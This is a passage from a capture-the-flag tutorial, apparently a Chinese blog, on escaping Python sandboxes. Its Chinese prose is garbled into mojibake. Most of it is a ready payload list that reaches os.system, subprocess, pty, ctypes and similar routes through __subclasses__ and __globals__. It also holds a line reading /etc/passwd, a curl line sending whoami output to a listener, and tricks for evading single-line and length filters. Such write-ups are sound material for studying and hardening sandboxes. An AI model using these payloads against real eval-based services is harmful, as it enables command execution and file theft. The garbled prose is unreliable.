().__class__.__base__.__subclasses__()[<span class="number">144</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç»Ÿä¸€æ‹¿â€œå­—å…¸è§†å›¾â€</span></span><br><span class="line">d1 = b1.__dict__ <span class="keyword">if</span> <span class="built_in">hasattr</span>(b1, <span class="string">&#x27;__dict__&#x27;</span>) <span class="keyword">else</span> b1</span><br><span class="line">d2 = b2.__dict__ <span class="keyword">if</span> <span class="built_in">hasattr</span>(b2, <span class="string">&#x27;__dict__&#x27;</span>) <span class="keyword">else</span> b2</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(d1 <span class="keyword">is</span> builtins.__dict__)  <span class="comment"># True â†’ d1 å°±æ˜¯å†…å»ºæ¨¡å—çš„å‘½åç©ºé—´</span></span><br><span class="line"><span class="built_in">print</span>(d2 <span class="keyword">is</span> builtins.__dict__)  <span class="comment"># True â†’ d2 ä¹Ÿæ˜¯åŒä¸€ä»½å‘½åç©ºé—´</span></span><br><span class="line"><span class="built_in">print</span>(d1 <span class="keyword">is</span> d2)                 <span class="comment"># True â†’ åŒä¸€ä»½ dictï¼ˆä¸æ˜¯æ‹·</span></span><br></pre></td></tr></table></figure></div>

<p>å¦å¤–åœ¨æ²™ç®±å†…å¤– <code>__builtins__</code> çš„å½¢æ€ä¹Ÿä¸åŒï¼š</p>
<ul>
<li><p><strong>æ¨¡å—é¡¶å±‚ï¼ˆä½ â€œå¤–é¢â€çš„æ™®é€šè„šæœ¬ï¼‰</strong><br> <code>__builtins__</code> æ˜¯ä¸€ä¸ª<strong>æ¨¡å—å¯¹è±¡</strong>ï¼ˆ<code>builtins</code>ï¼‰ã€‚æ¨¡å—å¯¹è±¡<strong>ä¸èƒ½ä¸‹æ ‡</strong>ï¼Œåªèƒ½ç‚¹å–å±æ€§ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span>(__builtins__) <span class="keyword">is</span> module   <span class="comment"># True</span></span><br><span class="line">__builtins__.__loader__        <span class="comment"># OK</span></span><br><span class="line">__builtins__[<span class="string">&quot;__loader__&quot;</span>]     <span class="comment"># TypeError: module is not subscriptable</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>exec(code, globals, locals)</code> ç­‰â€œæ²™ç®±â€æ‰§è¡Œï¼ˆä½ â€œé‡Œé¢â€çš„ç¯å¢ƒï¼‰</strong><br> å¦‚æœ <code>globals</code> é‡Œ<strong>æ²¡æœ‰</strong> key <code>&#39;__builtins__&#39;</code>ï¼ŒPython ä¼š<strong>è‡ªåŠ¨å¡å…¥ <code>builtins.__dict__</code>ï¼ˆä¸€ä¸ª dictï¼‰</strong>ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;print(type(__builtins__))&quot;</span>, &#123;&#125;)  <span class="comment"># &lt;class &#x27;dict&#x27;&gt;</span></span><br><span class="line"><span class="comment"># è¿™æ˜¯å­—å…¸ â†’ å¯ä»¥ä¸‹æ ‡è®¿é—®ï¼š</span></span><br><span class="line">__builtins__[<span class="string">&quot;__loader__&quot;</span>]             <span class="comment"># OKï¼ˆç­‰ä»·äº builtins.__dict__[&#x27;__loader__&#x27;]</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆ<strong>åœ¨æ²™ç®±é‡Œ <code>__builtins__[&quot;__loader__&quot;]</code> å¯ç”¨</strong>ï¼Œè€Œ<strong>åœ¨æ™®é€šè„šæœ¬é‡ŒåŒæ ·å†™æ³•ä¼šæŠ¥ TypeError</strong>ï¼šå‰è€…æ˜¯ <code>dict</code>ï¼Œåè€…æ˜¯æ¨¡å—ã€‚</p>

    </div>
  </div>

<h4 id="os-æ¨¡å—-2"><a href="#os-æ¨¡å—-2" class="headerlink" title="os æ¨¡å—"></a>os æ¨¡å—</h4><p>è€Œ <code>os._wrap_close</code> ç±»æœ¬èº«ä½äºç³»ç»Ÿæ¨¡å—ä¸­ï¼Œå› æ­¤å¯ä»¥ç›´æ¥é€šè¿‡è¯¥ç±»æ‰€åœ¨æ¨¡å—çš„å…¨å±€å‘½åç©ºé—´ç›´æ¥æ‰¾åˆ° <code>system</code> å‡½æ•°æ‰§è¡Œå‘½ä»¤ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">137</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;os._wrap_close&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">137</span>].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure></div>

<h4 id="sys-æ¨¡å—-1"><a href="#sys-æ¨¡å—-1" class="headerlink" title="sys æ¨¡å—"></a>sys æ¨¡å—</h4><p><code>sys.modules</code> æ˜¯ Python è¿è¡Œæ—¶çš„ä¸€ä¸ª <strong>å…¨å±€å­—å…¸</strong>ï¼Œç”¨æ¥<strong>ç¼“å­˜æ‰€æœ‰å·²ç»å¯¼å…¥çš„æ¨¡å—å¯¹è±¡</strong>ã€‚å®ƒæ˜¯ Python <strong>import æœºåˆ¶çš„æ ¸å¿ƒç¼“å­˜</strong>ï¼Œæ‰€æœ‰æ¨¡å—å¯¼å…¥éƒ½ä¼šç»è¿‡å®ƒã€‚</p>
<blockquote>
<p><code>sys.modules</code> çš„ä½œç”¨æ˜¯<strong>ç¼“å­˜å·²åŠ è½½çš„æ¨¡å—</strong>ã€‚å½“ä½ ç¬¬ä¸€æ¬¡ <code>import</code> ä¸€ä¸ªæ¨¡å—æ—¶ï¼ŒPython ä¼šåŠ è½½å¹¶æ‰§è¡Œè¯¥æ¨¡å—çš„ä»£ç ï¼Œç„¶åå°†æ¨¡å—å¯¹è±¡ä¿å­˜åˆ° <code>sys.modules</code> ä¸­ã€‚ä»¥åå†å¯¼å…¥åŒåæ¨¡å—æ—¶ï¼ŒPython ä¼šç›´æ¥ä» <code>sys.modules</code> é‡Œå–å‡ºå·²æœ‰çš„æ¨¡å—å¯¹è±¡ï¼Œè€Œä¸ä¼šå†æ¬¡åŠ è½½å’Œæ‰§è¡Œæ¨¡å—ä»£ç ã€‚</p>
</blockquote>
<p><code>sys.modules</code> æ˜¯å­—å…¸ç±»å‹ï¼Œå…¶ä¸­ï¼š</p>
<ul>
<li><strong>é”®ï¼ˆkeyï¼‰</strong>ï¼šæ¨¡å—åï¼ˆå­—ç¬¦ä¸²ï¼Œæ¯”å¦‚ <code>&#39;os&#39;</code>ã€<code>&#39;sys&#39;</code>ï¼‰</li>
<li><strong>å€¼ï¼ˆvalueï¼‰</strong>ï¼šæ¨¡å—å¯¹è±¡æœ¬èº«</li>
</ul>
<p>å› æ­¤å¦‚æœæˆ‘ä»¬èƒ½å¤Ÿä»å…¨å±€ç©ºé—´ä¸­æ‰¾åˆ° <code>sys</code> æ¨¡å—ä¹Ÿå°±æ‰¾åˆ°äº† <code>modules</code> å…¨å±€å­—å…¸ï¼Œè¿›è€Œæ‰¾åˆ°æ‰€æœ‰çš„æ¨¡å—ã€‚è¿™é‡Œè¿˜æ˜¯ä»¥ <code>warnings.catch_warnings</code> ä¸ºä¾‹ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">144</span>]</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.catch_warnings&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">144</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;id&#x27;</span>)</span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure></div>

<h2 id="å¸¸ç”¨-payload"><a href="#å¸¸ç”¨-payload" class="headerlink" title="å¸¸ç”¨ payload"></a>å¸¸ç”¨ payload</h2><h3 id="å‘½ä»¤æ‰§è¡Œ-1"><a href="#å‘½ä»¤æ‰§è¡Œ-1" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h3><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># os</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&quot;system&quot;</span>](<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># subprocess </span></span><br><span class="line">[ x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">&#x27;Popen&#x27;</span>][<span class="number">0</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># builtins</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_GeneratorContextManagerBase&quot;</span> <span class="keyword">and</span> <span class="string">&quot;os&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;__builtins__&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># help</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_GeneratorContextManagerBase&quot;</span> <span class="keyword">and</span> <span class="string">&quot;os&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;__builtins__&quot;</span>][<span class="string">&#x27;help&#x27;</span>]</span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;_wrap_close&quot;</span>][<span class="number">0</span>][<span class="string">&#x27;__builtins__&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#sys</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;sys&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;sys&quot;</span>].modules[<span class="string">&quot;os&quot;</span>].system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;_sitebuiltins.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) <span class="keyword">and</span> <span class="keyword">not</span> <span class="string">&quot;_Helper&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;sys&quot;</span>].modules[<span class="string">&quot;os&quot;</span>].system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#commands (not very common)</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;commands&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;commands&quot;</span>].getoutput(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pty (not very common)</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;pty&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;pty&quot;</span>].spawn(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#importlib</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;importlib&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].import_module(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;importlib&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#imp</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;imp.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].import_module(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;&#x27;imp.&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(x) ][<span class="number">0</span>][<span class="string">&quot;importlib&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pdb</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;pdb&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;pdb&quot;</span>].os.system(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ctypes</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;builtins&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;builtins&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;ctypes&#x27;</span>).CDLL(<span class="literal">None</span>).system(<span class="string">&#x27;ls /&#x27;</span>.encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># multiprocessing</span></span><br><span class="line">[ x.__init__.__globals__ <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> <span class="string">&quot;wrapper&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(x.__init__) <span class="keyword">and</span> <span class="string">&quot;builtins&quot;</span> <span class="keyword">in</span> x.__init__.__globals__ ][<span class="number">0</span>][<span class="string">&quot;builtins&quot;</span>].<span class="built_in">__import__</span>(<span class="string">&#x27;multiprocessing&#x27;</span>).Process(target=<span class="keyword">lambda</span>: <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;curl localhost:9999/?a=`whoami`&#x27;</span>)).start()</span><br></pre></td></tr></table></figure></div>

<h3 id="æ–‡ä»¶è¯»å–"><a href="#æ–‡ä»¶è¯»å–" class="headerlink" title="æ–‡ä»¶è¯»å–"></a>æ–‡ä»¶è¯»å–</h3><p>æ“ä½œæ–‡ä»¶å¯ä»¥ä½¿ç”¨ builtins ä¸­çš„ openï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ FileLoader æ¨¡å—çš„ get_data æ–¹æ³•ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ x <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__==<span class="string">&quot;FileLoader&quot;</span> ][<span class="number">0</span>].get_data(<span class="number">0</span>,<span class="string">&quot;/etc/passwd&quot;</span>)</span><br></pre></td></tr></table></figure></div>

<h1 id="ç»•è¿‡å¤šè¡Œé™åˆ¶"><a href="#ç»•è¿‡å¤šè¡Œé™åˆ¶" class="headerlink" title="ç»•è¿‡å¤šè¡Œé™åˆ¶"></a>ç»•è¿‡å¤šè¡Œé™åˆ¶</h1><p>ç»•è¿‡å¤šè¡Œé™åˆ¶çš„åˆ©ç”¨æ‰‹æ³•é€šå¸¸åœ¨é™åˆ¶äº†å•è¡Œä»£ç çš„æƒ…å†µä¸‹ä½¿ç”¨ã€‚ä¾‹å¦‚ <code>eval</code>ï¼Œä¸­é—´å¦‚æœå­˜åœ¨ <code>;</code> æˆ–è€…æ¢è¡Œä¼šæŠ¥é”™ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;);print(1)&quot;</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">&quot;&lt;string&gt;&quot;</span>, line <span class="number">1</span></span><br><span class="line">    <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>);<span class="built_in">print</span>(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></div>

<h2 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h2><p>exec å¯ä»¥æ”¯æŒæ¢è¡Œç¬¦ä¸ <code>;</code></p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">eval</span>(<span class="string">&quot;exec(&#x27;__import__(\&quot;os\&quot;)\\nprint(1)&#x27;)&quot;</span>)</span><br><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<h2 id="compile"><a href="#compile" class="headerlink" title="compile"></a>compile</h2><p><code>compile</code> åœ¨ <code>single</code> æ¨¡å¼ä¸‹ä¹ŸåŒæ ·å¯ä»¥ä½¿ç”¨ <code>\n</code> è¿›è¡Œæ¢è¡Œ, åœ¨ <code>exec</code>  æ¨¡å¼ä¸‹å¯ä»¥ç›´æ¥æ‰§è¡Œå¤šè¡Œä»£ç .</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;&#x27;&#x27;eval(compile(&#x27;print(&quot;hello world&quot;); print(&quot;heyy&quot;)&#x27;, &#x27;&lt;stdin&gt;&#x27;, &#x27;exec&#x27;))&#x27;&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<h2 id="æµ·è±¡è¡¨è¾¾å¼"><a href="#æµ·è±¡è¡¨è¾¾å¼" class="headerlink" title="æµ·è±¡è¡¨è¾¾å¼"></a>æµ·è±¡è¡¨è¾¾å¼</h2><p>æµ·è±¡è¡¨è¾¾å¼ï¼ˆ<code>:=</code>ï¼‰æ˜¯ Python 3.8 å¼•å…¥çš„ä¸€ç§æ–°çš„è¯­æ³•ç‰¹æ€§ï¼Œå®ƒèƒ½åœ¨<strong>ä¸€ä¸ªè¡¨è¾¾å¼é‡Œ</strong>å…ˆæŠŠå³è¾¹ç®—å¥½çš„å€¼<strong>èµ‹ç»™ä¸€ä¸ªå˜é‡</strong>ï¼Œ<strong>åŒæ—¶</strong>è¿™ä¸ªè¡¨è¾¾å¼æœ¬èº«çš„å€¼ä¹Ÿå°±æ˜¯é‚£ä¸ªå€¼ï¼Œä¹Ÿå°±æ˜¯åœ¨é€»è¾‘è¿ç®—ä¸­å¯ä»¥ä½¿ç”¨èµ‹å€¼æ“ä½œã€‚ä¾‹å¦‚ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (chunk := f.read(<span class="number">1024</span>)) != <span class="string">b&#x27;&#x27;</span>:</span><br><span class="line">    process(chunk)</span><br></pre></td></tr></table></figure></div>

<p>å› ä¸ºæµ·è±¡è¡¨è¾¾å¼éœ€è¦<strong>å…ˆæŠŠå³è¾¹ç®—å¥½å€¼</strong>ï¼Œè€Œåˆ—è¡¨éœ€è¦ä»å·¦åˆ°å³ä¾æ¬¡å¤„ç†ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å€ŸåŠ©<strong>æµ·è±¡è¡¨è¾¾å¼</strong>å’Œè¿‡<strong>åˆ—è¡¨</strong>æ¥æ‰§è¡Œå¤šè¡Œä»£ç ï¼š</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;[a:=__import__(&quot;os&quot;),b:=a.system(&quot;id&quot;)]&#x27;</span>)</span><br></pre></td></tr></table></figure></div>

<p>ä¹Ÿå°±æ˜¯è¯´ï¼š</p>
<ul>
<li>æµ·è±¡è¡¨è¾¾å¼ä¿è¯è¯­å¥ä¼šæ‰§è¡Œã€‚</li>
<li>åˆ—è¡¨ä¿è¯è¯­å¥æ‰§è¡Œé¡ºåºã€‚</li>
</ul>
<h1 id="ç»•è¿‡é•¿åº¦é™åˆ¶"><a href="#ç»•è¿‡é•¿åº¦é™åˆ¶" class="headerlink" title="ç»•è¿‡é•¿åº¦é™åˆ¶"></a>ç»•è¿‡é•¿åº¦é™åˆ¶</h1><p>BYUCTF_2023 ä¸­çš„å‡ é“ jail é¢˜å¯¹ payload çš„é•¿åº¦ä½œäº†é™åˆ¶</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>((<span class="built_in">__import__</span>(<span class="string">&quot;re&quot;</span>).sub(<span class="string">r&#x27;[a-z0-9]&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="built_in">input</span>(<span class="string">&quot;code &gt; &quot;</span>).lower()))[:<span class="number">130</span>])</span><br></pre></td></tr></table></figure></div>

<p>è¿™è¡Œä»£ç çš„æ„æ€æ˜¯ï¼š</p>
<ol>
<li>ç”¨æˆ·è¾“å…¥ä¸€æ®µå­—ç¬¦ä¸²ï¼ˆæ¯”å¦‚ <code>help()</code>ï¼‰ã€‚</li>
<li><code>.lower()</code> â†’ è½¬æˆå°å†™ï¼ˆ<code>help()</code> â†’ <code>help()</code>ï¼‰ã€‚</li>
<li><code>re.sub(r&#39;[a-z0-9]&#39;, &#39;&#39;, ...)</code> â†’ åˆ é™¤æ‰€æœ‰å°å†™å­—æ¯å’Œæ•°å­—ï¼ˆ<code>help()</code> â†’ <code>()</code>ï¼‰ã€‚</li>
<li>ç»“æœå­—ç¬¦ä¸²è¢« <code>[:130]</code> æˆªæ–­åˆ° 130 ä¸ªå­—ç¬¦ä»¥å†…ã€‚</li>
<li><code>eval()</code> æ‰§è¡Œè¿™ä¸ªå­—ç¬¦ä¸²ã€‚</li>
</ol>
<h2 id="æ›¿æ¢å‡½æ•°åç§°"><a href="#æ›¿æ¢å‡½æ•°åç§°" class="headerlink" title="æ›¿æ¢å‡½æ•°åç§°"></a>æ›¿æ¢å‡½æ•°åç§°</h2><p>é¢˜ç›®é™åˆ¶ä¸èƒ½å‡ºç°æ•°å­—å­—æ¯ï¼Œæ„é€ çš„ç›®æ ‡æ˜¯è°ƒç”¨ open å‡½æ•°è¿›è¡Œè¯»å–</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">open</span>(<span class="built_in">bytes</span>([<span class="number">102</span>,<span class="number">108</span>,<span class="number">97</span>,<span class="number">103</span>,<span class="number">46</span>,<span class="number">116</span>,<span class="number">120</span>,<span class="number">116</span>])).read())</span><br></pre></td></tr></table></figure></div>

<p>å‡½æ•°åæ¯”è¾ƒå¥½ç»•è¿‡ï¼Œç›´æ¥ä½¿ç”¨ unicodeã€‚æ•°å­—ä¹Ÿå¯ä»¥ä½¿ç”¨ ord æ¥è·å–ç„¶åè¿›è¡Œç›¸å‡ã€‚æˆ‘è¿™é‡Œé€‰æ‹©çš„æ˜¯ chr(333).</p>
